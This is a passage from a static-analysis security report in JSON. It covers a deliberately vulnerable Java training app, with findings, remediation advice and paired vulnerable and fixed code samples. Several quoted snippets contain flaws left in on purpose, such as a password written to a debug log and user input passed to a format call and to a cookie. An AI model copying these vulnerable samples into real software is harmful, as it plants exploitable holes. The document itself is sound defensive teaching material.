configuration.\n\nDefault multipart config values\nlocation=&quot;&quot;, fileSizeThreshold = 0bytes, MaxFileSize=unlimited, MaxRequestSize = unlimited.\n\nUse unpredictable tokens (CSRF Token).\nAny important request requires a digest of the user\u2019s session credential, which is different for every user (CSRF token). \nAdd a timestamp to the token.\nLimit the lifetime for which the user\u2019s credentials and tokens are valid. \nUse step up authentication.\nDo not perform any URL rewriting.\nDo not rely only on referrer checking.\nEliminate any XSS vulnerability.\nUse CAPTCHAs.", "impact": "No impact on functionalities and minimum to performance.\n\nIt is recommended to add the AntiForgeryToken to verbs POST, PUT and DELETE.\n\nThe ideal approach is to have a different anti-forgery token per user interaction, and this is the recommendation for sensitive applications. The impacts on the web server will need to be checked with the scale performance checks (different web servers will have different performance impacts and controls to minimize it). In case the performance impact cannot be accepted, the less secure approach is to implementing the anti-forgery per session. In this case, other controls must be put in place (same origin, timestamp, etc.) Refer to https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html for more information.\n\nIn order to enable CSRF token, the web.xml needs to be configured as well as the jsp pages.\nAll forms inside jsp pages need to be changed to generate the csrf token.\n\nChrome browser (and maybe other browsers in the future), enforces security for the application:\nCase 1: csrf enabled, secure enabled, <em class=\"bold\">via https</em>\nWhen both csrf and secure flag is enabled, accessing the application via https will not have any impact.\n\nCase 2: csrf enabled, secure enabled, <em class=\"bold\">via http</em>\nwhen secure flag is set, browser will not persist/send session cookie over http, so for each request new session id will be sent by browser. Having csrf enabled, this will cause &quot;Expected csrf token not found, has your session expired&quot; issue.\n<em class=\"bold\">Solution:</em> change application to be https only: When both csrf and secure flag is enabled, accessing the application via https will not have any impact.\n\n<em class=\"bold\">Case 3: csrf enabled, </em>secure not enabled<em class=\"bold\">, via http, chrome/other browser</em>\nApplication works, but is not secured: same session id is sent by browser in clear text, it is vulnerable to sniffing and mitm type of attacks. SAST will report this as &quot;Cookie Security: HTTPOnly not Set&quot;", "abstract": "Use of Multipart filter during download"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Denial of Service: Format String": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00426", "function": "java.io.PrintStream.format()", "line": "188", "snippet": "session.setAttribute(\"color\", value);\n\t    response.addCookie(new Cookie(\"color\", value)); //cwe 312 Cleartext Storage of Sensitive Information ->Improper Neutralization of CRLF Sequences in HTTP Headers, Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n\t    System.out.format(value); //CWE134_Uncontrolled_Format_String\n\t    \n\t    logger.info(\"CRLF injection veracode CWE 93\"+value); //CRLF Injection -> Improper Output Neutralization for Logs"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00427", "function": "java.io.PrintStream.format()", "line": "188", "snippet": "session.setAttribute(\"color\", value);\n\t    response.addCookie(new Cookie(\"color\", value)); //cwe 312 Cleartext Storage of Sensitive Information ->Improper Neutralization of CRLF Sequences in HTTP Headers, Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n\t    System.out.format(value); //CWE134_Uncontrolled_Format_String\n\t    \n\t    logger.info(\"CRLF injection veracode CWE 93\"+value); //CRLF Injection -> Improper Output Neutralization for Logs"}]}], "remediation": null}, "Missing Check against Null": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00440", "function": "getParameter(...) : ServletRequest.getParameter may return NULL()", "line": "174", "snippet": "final String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(\"pwd\").toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00441", "function": "getParameter(...) : ServletRequest.getParameter may return NULL()", "line": "186", "snippet": "});\n\t\t\n\t\tchar[] chars = (request.getParameter(\"pwd\").toCharArray());\n\t\tlogger.debug(\"Inside login validation debug\"+request.getParameter(\"pwd\"));"}]}], "remediation": {"remediation": {"@id": "R.0058", "@name": "Missing Check against Null", "@dateLastModified": "7/23/2020", "faqs": {"faq": {"question": "This is not a security vulnerability, why do we need to care?", "answer": "It is consider a security vulnerability as the issue may cause an exception the application, making it not available for the users."}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult EditGrade(string Username, string studentId, string subjectId, string instructorId, int Grade)\n        {\n            if (Session[&quot;user&quot;].ToString() == Username.Trim())\n            {\n                int recordId = context.StudentSubjectGrades.Where(c =&gt; c.Username == studentId &&\n                                               c.SubjectID == subjectId &&\n                                               c.InstructorID == instructorId).Select(r =&gt; r.ID).FirstOrDefault();\n\n                var record = context.StudentSubjectGrades.Find(recordId);\n\n                if (record != null)\n                {\n                    record.Grade = Grade;\n                    context.SaveChanges();\n                }\n            }\n            //Missing Check against Null\n           \n           string instructorID = <em class=\"red\">System.Web.HttpContext.Current.Session[&quot;user&quot;].ToString()</em>;\n           return RedirectToAction(&quot;StudentInstructorList&quot;, new { InstructorID = instructorID.Trim() });\n           \n                \n         }", "nonvulncode": "public ActionResult EditGrade(string Username, string studentId, string subjectId, string instructorId, int Grade)\n        {\n            if (Session[&quot;user&quot;].ToString() == Username.Trim())\n            {\n                int recordId = context.StudentSubjectGrades.Where(c =&gt; c.Username == studentId &&\n                                               c.SubjectID == subjectId &&\n                                               c.InstructorID == instructorId).Select(r =&gt; r.ID).FirstOrDefault();\n\n                var record = context.StudentSubjectGrades.Find(recordId);\n\n                if (record != null)\n                {\n                    record.Grade = Grade;\n                    context.SaveChanges();\n                }\n            }\n            //Missing Check against Null\n            var instructorID = System.Web.HttpContext.Current.Session[&quot;user&quot;];\n            <em class=\"blue\">if(instructorID != null)</em>\n            {\n                return RedirectToAction(&quot;StudentInstructorList&quot;, new { InstructorID = Convert.ToString(instructorID).Trim() });\n            }\n            else\n            {\n                return RedirectToAction(&quot;StudentInstructorList&quot;, new { InstructorID = &quot;&quot; });\n            }\n                \n         }", "comments": "Always perform null checking on the object before using it to avoid null pointer exception. \nDo not assume the environment or external variables will always be there for the code. Pay special attention to variables returning from a web service and include in the test scenarios when those are not accessible, overloaded, or failed to retrieve due to a timeouts. Also keep in mind that properties returned from web-services and external components may change after upgrading the systems, infrastructure or applying patches to it (e.g. upgrading to a new version of an Apache plugin may remove access to some local variables, or rename others).\nDetect all possible exceptions and fail gracefully.\n\nObservation in Fortify:\nFor the Vulnerable code if we write the code below, Fortify will not able to detect it. It needs to be assigned to a variable so fortify can detect the issue as shown in the vulnerable code.\n\nreturn RedirectToAction(&quot;StudentInstructorList&quot;, new { InstructorID = <em class=\"red\">System.Web.HttpContext.Current.Session[&quot;user&quot;].ToString().Trim()</em> });\n\nSame goes with the NonVulnerable code. If you write the code below, Fortify will not detect it that you perform a null checking.\n\nif( System.Web.HttpContext.Current.Session[&quot;user&quot;] != null)\n   return RedirectToAction(&quot;StudentInstructorList&quot;, new { InstructorID = System.Web.HttpContext.Current.Session[&quot;user&quot;].ToString().Trim() });", "impact": "No impact. Improved data management inside the code.", "abstract": "Use of null check"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean)\n\t{\t\t\n\t\t<em class=\"red\">if(userAccountBean.getUserName()!=null) </em>{\n\t\t\tuserAccountBean.setRoleID(&quot;role000002&quot;);\n\t\t\tString escapedVal = StringEscapeUtils.escapeHtml4(userAccountBean.getUserName());\n\t\t\t\n\t\t\tuserAccountBean.setUserName(escapedVal);\n\t\t\tuserAccountBean = dao.addUser(userAccountBean);\t\t\t\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,userAccountBean);\n\n\t\t} else {\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,new UserAccountBean());\n\t\t}\n\t}", "nonvulncode": "public ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean)\n\t{\n\t\t<em class=\"blue\">Optional&lt;UserAccountBean&gt; optUserAcc = Optional.ofNullable(userAccountBean);</em>\n\t\tif( <em class=\"blue\">optUserAcc.isPresent() </em>&& optUserAcc.get().getUserName()!=null) {\n<em class=\"blue\">userAccountBean= optUserAcc.get();</em>\n\t\t\tuserAccountBean.setRoleID(&quot;role000002&quot;);\n\t\t\tString escapedVal = StringEscapeUtils.escapeHtml4(userAccountBean.getUserName());\n\t\t\t\n\t\t\tuserAccountBean.setUserName(escapedVal);\n\t\t\tuserAccountBean = dao.addUser(userAccountBean);\t\t\t\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,userAccountBean);\n\n\t\t} else {\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,new UserAccountBean());\n\t\t}\n\t}", "comments": "Null check or isPresent check need to be done before performing any action(get/set) on particular object.\nOptional helps by making sure whoever is using an Optional knows that the value may not exist, and in some cases helps a programmer to do the equivalent of null checking for code to even compile.\nHowever, Optional.of will still throw null pointer exception if object is null, so Optional.ofNullable to used.", "impact": "No impact. Improved data management inside the code. \nMay need to implement Optional&lt;\u2026&gt; on all objects in the code.", "abstract": "Use of isPresent"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean)\n\t{\t\t\n\t\t<em class=\"red\">if(userAccountBean.getUserName()!=null) </em>{\n\t\t\tuserAccountBean.setRoleID(&quot;role000002&quot;);\n\t\t\tString escapedVal = StringEscapeUtils.escapeHtml4(userAccountBean.getUserName());\n\t\t\t\n\t\t\tuserAccountBean.setUserName(escapedVal);\n\t\t\tuserAccountBean = dao.addUser(userAccountBean);\t\t\t\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,userAccountBean);\n\n\t\t} else {\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,new UserAccountBean());\n\t\t}\n\t}", "nonvulncode": "public ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean)\n\t{\n                    <em class=\"blue\">    </em>if(<em class=\"blue\"> userAccountBean != null  && </em>userAccountBean.getUserName()!=null<em class=\"bold\"> ) </em>{\n\t\t\tuserAccountBean.setRoleID(&quot;role000002&quot;);\n\t\t\tString escapedVal = StringEscapeUtils.escapeHtml4(userAccountBean.getUserName());\n\t\t\t\n\t\t\tuserAccountBean.setUserName(escapedVal);\n\t\t\tuserAccountBean = dao.addUser(userAccountBean);\t\t\t\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,userAccountBean);\n\n\t\t} else {\n\t\t\treturn new ModelAndView(&quot;addUser&quot;,&quot;userAccountBean&quot;,new UserAccountBean());\n\t\t}\n\t}", "comments": "Check if the object is instantiated before calling a method inside it.", "impact": "no impact on the performance, but for critical and sensitive applications, developer is required to add this checks in many parts of the code to avoid creating a null deference.", "abstract": "Use of null check"}]}, "mitigations": {"mitigation": [{"system": "OS Linux", "configuration": "/etc/security/limits.conf", "backend": "ulimit -c 0", "frontend": "N/A", "comments": "Disable the core dump generation on Linux machines. \nRefer to https://linux-audit.com/understand-and-configure-core-dumps-work-on-linux/ to other options"}, {"system": "Web Server / IIS", "configuration": "//Update web.config to set a custom error page for application level error handling\n&lt;configuration&gt;\n  &lt;system.web&gt;\n    &lt;customErrors mode=&quot;On&quot; defaultRedirect=&quot;ErrorPage.aspx?handler=customErrors%20section%20-%20Web.config&quot;&gt;\n      &lt;error statusCode=&quot;401&quot; redirect=&quot;ErrorPage.aspx?msg=1&amp;handler=customErrors%20section%20-%20Web.config&quot;/&gt;\n      &lt;error statusCode=&quot;404&quot; redirect=&quot;ErrorPage.aspx?msg=1&amp;handler=customErrors%20section%20-%20Web.config&quot;/&gt;\n      &lt;error statusCode=&quot;500&quot; redirect=&quot;ErrorPage.aspx?msg=1&amp;handler=customErrors%20section%20-%20Web.config&quot;/&gt;\n    &lt;/customErrors&gt;\n  &lt;/system.web&gt;\n&lt;/configuration&gt;", "backend": "N/A", "frontend": "N/A", "comments": "There should be a corresponding ErrorPage.aspx page created to implement this approach. \n\nConfigure the same error page used by all application errors to all status, including status-400's and 500's. Customize the page to have a generic message and not show any server or application information (e.g. do not show webserver version, application stack, languages, modules, IP's, etc.).\n\nThe Installation scripts, configuration, hardening guides, and Change Management documentation for the web server needs to be updated to ensure this option is always set even after future maintenance.\n\nThe monitoring systems need to create a use case to check periodically if this option is set (e.g.: deploy an status application to the web server that include the server/node status and a stack error that should always be generic)"}, {"system": "Web Server / IIS", "configuration": ".NET Error Pages configured using Internet Information Services (IIS) Manager", "backend": "N/A", "frontend": "Change error pages configuration on UI and point all to a generic and static error message.", "comments": "In some IIS instances, the configuration is performed by using the UI instead of the automatic webconfig creation and deployment. In this case, administrators need to configure a single error page on the web server (IIS) and make sure the same setting is applied to all nodes of the cluster / dockers / DDoS protection/ multi-instances / cloud Elastic-IP / etc\u2026 serving the applications.\n\nThere should be a corresponding ErrorPage.aspx page created to implement this approach. \n\nConfigure the same error page used by all application errors to all status, including status-400's and 500's. Customize the page to have a generic message and not show any server or application information (e.g. do not show webserver version, application stack, languages, modules, IP's, etc.).\n\nThe Installation scripts, configuration, hardening guides, and Change Management documentation for the web server needs to be updated to ensure this option is always set even after future maintenance.\n\nThe monitoring systems need to create a use case to check periodically if this option is set (e.g.: deploy an status application to the web server that include the server/node status and a stack error that should always be generic)"}]}}}}, "Missing XML Validation": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00442", "function": "factory.setValidating(...)", "line": "970", "snippet": "DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setNamespaceAware(true);\n        factory.setValidating( false );\n        DocumentBuilder builder;\n        Document doc = null;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00443", "function": "factory.setValidating(...)", "line": "659", "snippet": "DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setNamespaceAware(true);\n        factory.setValidating( false );\n        DocumentBuilder builder;\n        Document doc = null;"}]}], "remediation": {"remediation": {"@id": "R.0075", "@name": "Missing XML Validation", "@dateLastModified": "2/24/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult UploadEmployeeXML()\n        {\n            var postedFiles = Request.Files;\n\n            for (int i = 0; i &lt; postedFiles.Count; i++)\n            {\n                HttpPostedFileBase file = postedFiles[i];\n                currentFileName = Path.GetFileName(file.FileName);\n\n                string xmlPath = Server.MapPath($&quot;~/DataContents/{currentFileName}&quot;);\n              \n               <em class=\"red\"> XmlReader reader = XmlReader.Create(file.InputStream);</em>\n                DataSet ds = new DataSet();\n                ds.ReadXml(reader);\n                    foreach (DataRow row in ds.Tables[0].Rows)\n                    {\n                        using (VulnAppDBEntities dbContext = new VulnAppDBEntities())\n                        {\n                            Employee employee = new Employee();\n\n                            employee.Name = row[&quot;Name&quot;].ToString();\n                            employee.Gender = row[&quot;Gender&quot;].ToString();\n                            employee.City = row[&quot;City&quot;].ToString();\n                            employee.Salary = Convert.ToDecimal(row[&quot;Salary&quot;].ToString());\n                            employee.DepartmentId = Convert.ToInt32(row[&quot;DepartmentId&quot;].ToString());\n                            employee.SocialSecurityNo = row[&quot;SocialSecurityNo&quot;].ToString();\n                            dbContext.Employees.Add(employee);\n                            dbContext.SaveChanges();\n                        }\n                    }\n                    file.SaveAs(xmlPath);\n                    messages.Add($&quot;Validation success for { currentFileName} and data has been inserted to the database.&quot;);\n                \n            }\n\n            return View(&quot;UploadEmployee&quot;, messages);\n        }", "nonvulncode": "public ActionResult UploadEmployeeXML()\n        {\n            var postedFiles = Request.Files;\n\n            for (int i = 0; i &lt; postedFiles.Count; i++)\n            {\n                HttpPostedFileBase file = postedFiles[i];\n                currentFileName = Path.GetFileName(file.FileName);\n\n                string xmlPath = Server.MapPath($&quot;~/DataContents/{currentFileName}&quot;);\n              <em class=\"blue\">  string xsdPath = Server.MapPath($&quot;~/DataContents/EmployeeSchema.xsd&quot;);\n</em>\n               <em class=\"blue\"> XmlReaderSettings settings = new XmlReaderSettings();\n                settings.ValidationType = ValidationType.Schema;\n                \n                settings.Schemas.Add(&quot;&quot;, xsdPath);\n                settings.ValidationEventHandler += new ValidationEventHandler(OnValidationError);</em>\n\n                XmlReader reader = XmlReader.Create(file.InputStream, settings);\n                DataSet ds = new DataSet();\n                ds.ReadXml(reader);\n                if (flag)\n                {\n                    messages.Add($&quot;Schema validation failed for { currentFileName}&quot;);\n                }\n                else\n                {\n                    foreach (DataRow row in ds.Tables[0].Rows)\n                    {\n                        using (VulnAppDBEntities dbContext = new VulnAppDBEntities())\n                        {\n                            Employee employee = new Employee();\n\n                            employee.Name = row[&quot;Name&quot;].ToString();\n                            employee.Gender = row[&quot;Gender&quot;].ToString();\n                            employee.City = row[&quot;City&quot;].ToString();\n                            employee.Salary = Convert.ToDecimal(row[&quot;Salary&quot;].ToString());\n                            employee.DepartmentId = Convert.ToInt32(row[&quot;DepartmentId&quot;].ToString());\n                            employee.SocialSecurityNo = row[&quot;SocialSecurityNo&quot;].ToString();\n                            dbContext.Employees.Add(employee);\n                            dbContext.SaveChanges();\n                        }\n                    }\n                    file.SaveAs(xmlPath);\n                    messages.Add($&quot;Validation success for { currentFileName} and data has been inserted to the database.&quot;);\n                }\n            }\n\n            return View(&quot;UploadEmployee&quot;, messages);\n        }", "comments": "Having no validation, the application is allowing the attacker to supply malicious input which might lead to unexpected behavior of the application. \n\nIn the vulnerable example, the application is allowing user to upload some xml and no validation in place and this might resulted crushing the application. Let say an attacker inputted a non-numeric value on salary and having this value will result crashing your application since there also no handing of errors that may occur.\n\nThe recommendation is always validate the xml before processing the xml especially if is coming from the user input. \n\nWith the non-vulnerable code, the application is rejecting the xml file if it doesn\u2019t conform to the xsd file.", "impact": "Business have to define the full xml shema to be accepted.\nCreate and import the xsd containing the validations for each element. \nDo not use &quot;xs:any&quot; and avoid using &quot;lax&quot; on the xsd. Those will bypass the validation and allow users to do xml manipulation attacks.\nMake sure the validations are performed by the code against the xsd validations.", "abstract": "Use of xml schema validation"}, {"@type": "JAVA/JSP", "vulncode": "EmployeeController.j<em class=\"bold\">ava</em>\npublic ModelAndView retrieveEmployeeByID(@RequestParam(&quot;empID&quot;) Integer empID,HttpServletRequest request) throws IOException, ParserConfigurationException, SAXException { \n\t\tModelAndView mv = new ModelAndView();\n\t\t\n\t\tDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setNamespaceAware(true);\n        DocumentBuilder builder;\n        Document doc = null;\n        String rootPath = System.getProperty(&quot;catalina.home&quot;)+File.separator+&quot;tmpFiles&quot;+File.separator+&quot;EmployeeFeedVul.xml&quot;;\n        try {\n            builder = factory.newDocumentBuilder();\n       <em class=\"red\">     doc = builder.parse(rootPath);\n</em>\n            XPathFactory xpathFactory = XPathFactory.newInstance();\n            XPath xpath = xpathFactory.newXPath();\n            String empNum= request.getParameter(&quot;empID&quot;);\n\n           SimpleVariableResolver variableResolver = new SimpleVariableResolver();\n\t\t\tvariableResolver.addVariable(new QName(&quot;empNum&quot;), empNum);\n\t\t\txpath.setXPathVariableResolver(variableResolver);\n\t\t\tXPathExpression expr = xpath.compile(&quot;/EmployeeInfo/employeedtl[@id=$empNum]/empName/text()&quot;);\n            String  name = (String) this.expr.evaluate(doc, XPathConstants.STRING);\n            mv.setViewName(&quot;uploadFile&quot;);\n            String msg = &quot;Employee name is &quot;+name;\n\t\t\tmv.addObject(&quot;msg&quot;,msg);\n        }", "nonvulncode": "EmployeeController.j<em class=\"bold\">ava</em>\npublic ModelAndView retrieveEmployeeByID(@RequestParam(&quot;empID&quot;) Integer empID,HttpServletRequest request) throws IOException, ParserConfigurationException, SAXException { \n\t\tModelAndView mv = new ModelAndView();\n\t\t\n\t\tDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setNamespaceAware(true);\n        DocumentBuilder builder;\n        Document doc = null;\n        String rootPath = System.getProperty(&quot;catalina.home&quot;)+File.separator+&quot;tmpFiles&quot;+File.separator+&quot;EmployeeFeedVul.xml&quot;;\n        try {\n<em class=\"blue\">SchemaFactory schfactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\n\t\t\tString schemaFile = System.getProperty(&quot;user.dir&quot;) + &quot;\\\\EmployeeInfo.xsd&quot;;\n\t\t\tSchema schema = schfactory.newSchema(new StreamSource(schemaFile));\n\n\t\t\tfactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n\t\t\tfactory.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);\n\t\t\tfactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);\n\t\t\tfactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);\n\t\t\tfactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);\n\t\t\tfactory.setSchema(schema);\nFile file = new File(rootPath);\n\t\t\tValidator validator = schema.newValidator();validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);\nvalidator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);\n\t\t\tvalidator.validate(new StreamSource(file));\n</em>            builder = factory.newDocumentBuilder();\n       <em class=\"red\">     doc = builder.parse(rootPath);\n</em>\n            XPathFactory xpathFactory = XPathFactory.newInstance();\n            XPath xpath = xpathFactory.newXPath();\n            String empNum= request.getParameter(&quot;empID&quot;);\n\n           SimpleVariableResolver variableResolver = new SimpleVariableResolver();\n\t\t\tvariableResolver.addVariable(new QName(&quot;empNum&quot;), empNum);\n\t\t\txpath.setXPathVariableResolver(variableResolver);\n\t\t\tXPathExpression expr = xpath.compile(&quot;/EmployeeInfo/employeedtl[@id=$empNum]/empName/text()&quot;);\n            String  name = (String) this.expr.evaluate(doc, XPathConstants.STRING);\n            mv.setViewName(&quot;uploadFile&quot;);\n            String msg = &quot;Employee name is &quot;+name;\n\t\t\tmv.addObject(&quot;msg&quot;,msg);\n        }", "comments": "Having no validation, the application is allowing the attacker to supply malicious input which might lead to unexpected behavior of the application. \n\nIn the vulnerable example, the application is allowing user to upload some xml and no validation in place and this might resulted crushing the application. Let say an attacker inputted a non-numeric value on salary and having this value will result crashing your application since there also no handing of errors that may occur.\n\nThe recommendation is always validate the xml before processing the xml especially if is coming from the user input. \n\nWith the non-vulnerable code, the application is rejecting the xml file if it doesn\u2019t conform to the xsd file.\n\nReference: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html", "impact": "Business have to define the full xml shema to be accepted.\nCreate and import the xsd containing the validations for each element. \nDo not use &quot;xs:any&quot; and avoid using &quot;lax&quot; on the xsd. Those will bypass the validation and allow users to do xml manipulation attacks.\nMake sure the validations are performed by the code against the xsd validations.", "abstract": "Use of xml schema validation"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Poor Error Handling: Overly Broad Catch": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00444", "function": "CatchBlock()", "line": "63", "snippet": "try {\n\t\t\tdepartmentMap =  getDepartmentMap();\n\t\t} catch (Exception e) {\n\t\t\tlogger.debug(\"Error in cloning\");\n\t\t}"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00445", "function": "CatchBlock()", "line": "40", "snippet": "// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t} catch (Exception e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();"}]}], "remediation": {"remediation": {"@id": "R.0017", "@name": "Poor Error Handling: Overly Broad Catch", "@dateLastModified": "7/3/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public void Employees(int departmentID, int param)\n        {\n            try\n            {\n                VulnerableAppContext dbContext = new VulnerableAppContext();\n                List&lt;Employee&gt; emplist = dbContext.Employees.Where(emp =&gt; emp.DepartmentId == departmentID).ToList();\n\n                foreach (var item in emplist)\n                {\n                    item.Salary = item.Salary / param;//compute the monthly Salary\n                }\n\n                grvEmployee.DataSource = emplist;\n                grvEmployee.DataBind();\n\n            }\n            <em class=\"red\">catch (Exception ex)</em>\n            {\n                lblError.Text = &quot;An error occurred on this page. &quot; + ex.Message.ToString();\n            }\n        }", "nonvulncode": "public void Employess(int departmentID, int param)\n        {\n            try\n            {\n                VulnerableAppContext dbContext = new VulnerableAppContext();\n                List&lt;Employee&gt; emplist = dbContext.Employees.Where(emp =&gt; emp.DepartmentId == departmentID).ToList();\n\n                foreach (var item in emplist)\n                {\n                    item.Salary = item.Salary / param;//compute the monthly Salary\n                }\n\n                grvEmployee.DataSource = emplist;\n                grvEmployee.DataBind();\n\n            }\n            <em class=\"blue\">catch (SqlException sqlEx)</em>\n            {  // Send e-mail to DBA team to check.\n                lblError.Text = &quot;An SQL error has occured. &quot; + sqlEx.Message.ToString();\n            }\n           <em class=\"blue\"> catch (DivideByZeroException nullex)</em>\n            {  // Return the user to the form page, stating the value for months need to be &gt; 0\n                lblError.Text = &quot;Divided by zero exception has occured. &quot; + nullex.Message.ToString();\n            }\n            catch (Exception ex)\n            {  // Generate error message, log off user, kill session on server, close DB connection, ... fail gracefully\n                lblError.Text = &quot;An error occurred on this page. &quot; + ex.Message.ToString();\n            }\n        }", "comments": "In the sample code, handling different type of exception you can apply different logic for the application to recover or fail gracefully. \nFor generic exception you cannot do this.\nLet say, if SQLException is thrown you will add logic to log a ticket or send an e-mail to the support team to check the issue. \nWe can also customize our error message depending on the exception encountered (depending on Business Requirements and approvals).\nIn handling exception try to list all possible exception that are possible to be handled, and only generate a error (failure to treat the exception, generic exception catches) as a last resource.\n\nMake the application to fail safe, securely and gracefully. https://owasp.org/www-community/Fail_securely", "impact": "Determining business logic to treat all possible exceptions caught and align with the other teams how to handle / create tickets for exceptions on the code. \n\nE.g.: the DBA team will need to analyze the DB logs to understand if the Database server is overloaded with so many connections from the application, generating a SQLException, or if was a network issue... This scenario may lead to new strategies on the DB integration, but require attention from both teams).\n\nExceptions recorded on the logs needs to be checked by the application operations team.", "abstract": "By using as many as specific catch covering everything in code"}, {"@type": "Java/JSP", "vulncode": "@RequestMapping(value=&quot;fileupload.html&quot;, method=RequestMethod.POST)\npublic ModelAndView processUpload(@RequestParam(&quot;file&quot;) CommonsMultipartFile file) throws IOException {\n    System.out.println(&quot;ModelAndView --- upload&quot;);\n    ModelAndView mv= new ModelAndView();\n    if (!file.isEmpty()) {\n       String name = file.getOriginalFilename();\n       String extension = FilenameUtils.getExtension(file.getOriginalFilename());\t\t\n      if (&quot;txt&quot;.equals(extension)) {\n      try {\n           byte[] bytes = file.getBytes();\n           String rootPath = System.getProperty(&quot;catalina.home&quot;);\n           File dir = new File(rootPath + File.separator + &quot;tmpFiles&quot;);\n           if (!dir.exists())\n              dir.mkdirs();\n              File serverFile = new File(dir.getAbsolutePath() + File.separator + name);\n              BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(serverFile));\n              stream.write(bytes);\n              stream.close();\t\t\n             mv.setViewName(&quot;uploadFile&quot;);\n             mv.addObject(&quot;msg&quot;,&quot;You successfully uploaded file=&quot; + name);\n             return mv;\n          <em class=\"red\">} catch (Exception e) {</em>\n             mv.setViewName(&quot;uploadFile&quot;);\n             mv.addObject(&quot;msg&quot;, &quot;You failed to upload &quot; + name + &quot; =&gt; &quot;);\n             return mv;}\n         } else {\n              mv.setViewName(&quot;uploadFile&quot;);\n              mv.addObject(&quot;msg&quot;, &quot;Only text files can be uploaded&quot;);\n              return mv;\n                 }\n        } else {\n               mv.setViewName(&quot;uploadFile&quot;);\n               mv.addObject(&quot;msg&quot;, &quot;You failed to upload because the file was empty.&quot;);\n               return mv;\n      }\n}", "nonvulncode": "@RequestMapping(value=&quot;fileupload.html&quot;, method=RequestMethod.POST)\npublic ModelAndView processUpload(@RequestParam(&quot;file&quot;) CommonsMultipartFile file) throws IOException {\n    System.out.println(&quot;ModelAndView --- upload&quot;);\n    ModelAndView mv= new ModelAndView();\n    if (!file.isEmpty()) {\n       String name = file.getOriginalFilename();\n       String extension = FilenameUtils.getExtension(file.getOriginalFilename());\t\t\n      if (&quot;txt&quot;.equals(extension)) {\n      try {\n           byte[] bytes = file.getBytes();\n           String rootPath = System.getProperty(&quot;catalina.home&quot;);\n           File dir = new File(rootPath + File.separator + &quot;tmpFiles&quot;);\n           if (!dir.exists())\n              dir.mkdirs();\n              File serverFile = new File(dir.getAbsolutePath() + File.separator + name);\n              BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(serverFile));\n              stream.write(bytes);\n              stream.close();\t\t\n             mv.setViewName(&quot;uploadFile&quot;);\n             mv.addObject(&quot;msg&quot;,&quot;You successfully uploaded file=&quot; + name);\n             return mv;\n          }\n         <em class=\"blue\"> catch 